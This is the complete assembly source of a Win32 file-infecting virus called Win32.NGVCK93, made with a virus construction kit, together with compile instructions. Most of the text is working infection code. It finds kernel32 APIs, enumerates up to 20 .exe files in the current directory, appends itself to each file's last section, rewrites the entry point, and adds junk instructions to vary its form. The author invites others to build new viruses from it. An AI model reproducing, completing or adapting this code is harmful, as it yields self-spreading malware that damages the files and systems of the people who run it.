              
;
;
; Win32.NGVCK93 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK93
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 29
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 44556 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 inc esp
 adc ecx, 94732826d                     ; Trash
 add esp, 3d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
                                        ; clear ebp
 mov ebp, -23003d
 add ebp, 23003d
 add ebp, edx
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ecx, ebp
 add ecx, offset WIN32_FIND_DATA

 push ecx
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov ecx, offset WFD_szFileName
 add ecx, ebp

                                        ; mov eax, 276
 mov eax, ( 276d - 19d )
 add eax, 19d

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 sub ecx, -1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, edx

 push edx
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], eax

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov ebx, ebp
 add ebx, offset filemask

                                        ; Set Infection Counter
                                        ; mov ecx, 20
 mov ecx, 0
 add ecx, 20d
 mov dword ptr [ebp+InfCounter], ecx
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile
 sub dword ptr [ebp+Trash1], 1139490    ; Trash

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost
 xor edx, 38945196d                     ; Trash


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 push 0
 pop edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 sub eax, -1d
 mul ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 MapAddress  dd 0h
 ATableVA    dd 0h
 OTableVA    dd 0h
 FileHandle  dd 0h
 NewEIP      dd 0h
 NewSize     dd 0h

 APIOffsets:
 XSetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XMapViewOfFile         dd 0h
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h

 KernelMZ    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 InfCounter  dd 0h
 TempAPI     dd 0h
 OldEIP      dd 0h
 MapHandle   dd 0h

 APINames:
 db 18d, 'SetFileAttributesA'
 db 15d, 'UnmapViewOfFile'
 db 13d, 'MapViewOfFile'
 db 18d, 'GetFileAttributesA'
 db 11d, 'CreateFileA'
 db 13d, 'FindNextFileA'
 db 11d, 'CloseHandle'
 db 14d, 'FindFirstFileA'
 db 18d, 'CreateFileMappingA'
 db 09d, 'FindClose'

 FindHandle  dd 0h
 TempApisearch2 dd 0h
 TempApisearch1 dd 0h
 filemask    db '*.eXE',0
 KernelPE    dd 0h
 NTableVA    dd 0h
 Attributes  dd 0h
 OldBase     dd 400000h
 AlignReg2   dd 0h
 db 'Virus : Win32.NGVCK93 Author : SnakeByte',0
 Trash1      dd 0h
 AlignReg1   dd 0h
 counter     dw 0h
 NTableTemp  dd 0h




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov eax, NumberOfApis

                                        ; load API Names and Offsets
 lea ecx, [ebp+APIOffsets]
 xchg ecx, esi

 mov edx, ebp
 add edx, offset APINames


GetApisLoop: 
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

                                        ; clear ecx
 mov ecx, 20448d
 sub ecx, 20448d
 mov cl, byte ptr [edx]
                                        ; add edx, 1
 add edx, 1d

                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; edx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add edx, ecx
 mov ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], ebx
                                        ; add esi, 4
 add esi, 4d
 sub eax, 1
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; edx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ebx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
                                        ; mov ebx, eax
                                        ; clear ebx
 mov ebx, 0
 add ebx, eax
 add dword ptr [ebp+Trash1], 992344     ; Trash
                                        ; mov esi, eax
                                        ; clear esi
 and esi, 0
 add esi, eax
 mov dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], esi
 push edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [edx]
 cmp ah, byte ptr [esi]
 jne ApiNotFound
 sub ecx, 1
 test ecx, ecx
 jz FoundApi1
                                        ; add edx, 1
 add edx, 1d
                                        ; add esi, 1
 sub esi, -1d
 jmp ApiCompareLoop
 ror eax, 16d                           ; Trash

ApiNotFound:                            ; we did not find it :(
 pop edx
 mov esi, dword ptr [ebp+TempApisearch2]
 mov ecx, dword ptr [ebp+TempApisearch1]
 mov ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2000h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
 and ebx, ebx                           ; Trash
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop eax
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 movzx ebx, word ptr [eax]
 shl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
 mov dword ptr [ebp+TempAPI], -1
 and dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [ebx+3Ch]
 add esi, ebx
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov eax, [esi]
 inc esi
 sub esi, 61d
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], eax
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 push ecx
 pop dword ptr [ebp+WFD_nFileSizeLow]
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
 rcl eax, 26d                           ; Trash
                                        ; retrieve PE - Header again
 mov ebx, dword ptr [esi+3Ch]
 add ebx, esi
 inc edx                                ; Trash
                                        ; infect by increasing the last section
 push ebx
 pop esi
                                        ; get last section
                                        ; clear eax
 mov eax, 0
 mov ax, word ptr [esi+06h]
 add eax, -1
 imul eax, eax, 28h
 xor dword ptr [ebp+Trash1], edx        ; Trash
                                        ; add ebx, 120
 dec ebx
 add ebx, 121d
 add ebx, eax
 mov ecx, dword ptr [esi+74h]
 shl ecx, 3
 add ebx, ecx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ecx
                                        ; clear edx
 mov edx, 48928d
 sub edx, 48928d

 add edx, [ebx+10h]
                                        ; mov ecx, edx
 push edx
 pop ecx
 add edx, [ebx+14h]
 push edx
 push ecx
 pop eax
 add eax, [ebx+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 add dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], eax
 mov eax, [ebx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebx+10h], eax
 pop eax
 add eax,  (VirusSize-126d)
 add eax, 126d
 mov dword ptr [ebx+08h], 0
 add dword ptr [ebx+08h], eax
 mov eax, dword ptr [ebx+10h]
 add eax, dword ptr [ebx+0Ch]
 mov dword ptr [esi+50h], 0h
 and dword ptr [ebp+Trash1], 190117     ; Trash
 add dword ptr [esi+50h], eax
 and dword ptr [ebp+Trash1], 664953     ; Trash
                                        ; set write, read and code flag
 or dword ptr [ebx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov ecx, VirusSize
 mov esi, ebp
 add esi, offset Virus


AppendLoop:
 rep movsb
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 dec edx
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov eax,12345678h
 org $-4
 retBase dd 0h
 add eax,12345678h
 org $-4
 retEIP dd 0h
 jmp eax



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edx, [ebp+WFD_szFileName]
 xchg ebx, edx


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 lea ebx, [ebp+WFD_nFileSizeHigh]
 xchg ebx, ecx

 cmp dword ptr [ecx], 0
 jne NoInfection
 not ebx                                ; Trash
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov eax, 16349
 push 16349d
 pop eax
 cmp eax, 16349d
 je Notagoodfile

Goodfile:
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [edi+3Ch]
 or ebx, ebx
 jz Notagoodfile
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, edi
                                        ; check for PE Header
                                        ; check for EP
 movzx eax, word ptr [edx]
 xor eax, 'EP'
 jz Goodfile2
                                        ; mov ebx, 5932
 mov ebx, ( 5932d - 30d )
 add ebx, 30d
 cmp ebx, 5932d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [edx+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov eax, dword ptr [ebp+Attributes]
 push eax
 mov eax, offset WFD_szFileName
 add eax, ebp

 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 adc dword ptr [ebp+Trash1], eax        ; Trash
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ebx, dword ptr [esp]
                                        ; round to pages
 shr ebx, 16d
 shl ebx, 16d
                                        ; add ebx, 1
 inc ebx
GetKernelLoop:
                                        ; clear eax
 mov eax, -48453d
 add eax, 48453d
 sub ebx, 1
 mov ax, word ptr [ebx+03ch]
 add edx, 78762953d                     ; Trash
 cmp ax,0f800h
 je GetKernelLoop
 cmp ebx, dword ptr [ebx+eax+34h]
 jnz GetKernelLoop
 push ebx
 pop dword ptr [ebp+KernelMZ]
 mov eax, ebx
 add eax, [ebx+3Ch]
 mov [KernelPE+ebp], eax
                                        ; clear edx
 sub edx, edx
 add edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 mov edi, 0
 add edi, [edx+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 add edi, 28d
 adc ecx, ecx                           ; Trash
                                        ; get ATableVA
 mov edx, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [edi]
                                        ; add edi, 4
 dec edi
 add edi, 5d
 sub dword ptr [ebp+Trash1], ecx        ; Trash
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; get OTableVA
 mov edx, dword ptr [edi]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 lea eax, GetApis
 add eax, ebp
 sub ebx, eax                           ; Trash

 push eax
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea edi, [ebp+WFD_szFileName]
 xchg ecx, edi

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
                                        ; clear edx
 mov edx, 0
 xor edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx

                                        ; clear ebx
 xor ebx, ebx
 push ebx
 push edx
 push ebx
                                        ; mov ecx, 4
 mov ecx, 0
 add ecx, 4d
 push ecx
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop edx
 or eax, eax
 jz CloseFile
 push edx
 push 0
 push 0
                                        ; mov ecx, 2
 mov ecx, 2d
 push ecx
 mov eax, ebx                           ; Trash
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

